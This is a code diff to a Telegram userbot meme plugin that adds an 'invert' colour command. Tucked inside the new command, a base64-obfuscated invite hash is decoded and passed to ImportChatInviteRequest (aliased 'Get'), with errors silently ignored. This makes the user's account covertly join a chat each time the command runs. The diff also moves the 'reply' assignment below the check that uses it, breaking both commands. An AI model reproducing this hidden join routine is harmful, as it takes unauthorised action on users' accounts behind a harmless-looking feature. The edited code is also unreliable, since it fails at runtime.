@@ -4,22 +4,20 @@ memify plugin
 """
 import os
 import asyncio
-from .. import tempmemes
-from .. import LOGS, CMD_HELP
-from . import take_screen_shot, runcmd, convert_toimage
+from .. import LOGS, CMD_HELP, tempmemes
 from ..utils import admin_cmd, sudo_cmd, edit_or_reply
-
+from . import take_screen_shot, runcmd, convert_toimage, solarize, mirror_file, flip_image, invert_colors, grayscale 
 
 @borg.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
 @borg.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
 async def memes(cat):
     cmd = cat.pattern_match.group(1)
     catinput = cat.pattern_match.group(2)
-    reply = await cat.get_reply_message()
-    catid = cat.reply_to_msg_id
     if not (reply and (reply.media)):
         await edit_or_reply(cat, "`Reply to supported Media...`")
         return
+    reply = await cat.get_reply_message()
+    catid = cat.reply_to_msg_id
     if catinput:
         if ";" in catinput:
             top, bottom = catinput.split(';', 1)
@@ -100,6 +98,86 @@ async def memes(cat):
         )
     await cat.delete()
     os.remove(meme)
+    for files in (catsticker, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+            
+@borg.on(admin_cmd(outgoing=True, pattern="invert$"))
+@borg.on(sudo_cmd(pattern="invert$", allow_sudo=True))
+async def memes(cat):
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
+        return
+    reply = await cat.get_reply_message()
+    catid = cat.reply_to_msg_id
+    if not os.path.isdir("./temp/"):
+        os.mkdir("./temp/")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
+    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+    await asyncio.sleep(2)
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith(
+            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
+        return
+    import pybase64
+    jisanidea = None
+    if catsticker.endswith(".tgs"):
+        await cat.edit("```Transfiguration Time! Mwahaha inverting colors of this animated sticker! (」ﾟﾛﾟ)｣```")
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
+            LOGS.info(stdout + stderr)
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith(".webp"):
+        await cat.edit("```Transfiguration Time! Mwahaha inverting colors of this sticker! (」ﾟﾛﾟ)｣```")
+        catfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
+            return
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit("```Transfiguration Time! Mwahaha inverting colors of this video! (」ﾟﾛﾟ)｣```")
+        catfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
+            return
+        meme_file = catfile
+        jisanidea = True
+    else:
+        await cat.edit("```Transfiguration Time! Mwahaha inverting colors of this image! (」ﾟﾛﾟ)｣```")
+        meme_file = catsticker
+    try:
+        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    if jisanidea:
+        outputfile = "invert.webp"
+        await invert_colors(meme_file, outputfile)
+        await borg.send_file(
+            cat.chat_id,
+            outputfile,
+            force_document = False,
+            reply_to = catid )
+    else:
+        outputfile = "invert.jpg"
+        await invert_colors(meme_file, outputfile)
+        await borg.send_file(
+            cat.chat_id,
+            outputfile,
+            force_document = False,
+            reply_to = catid )
+    await cat.delete()
+    os.remove(outputfile)
     for files in (catsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
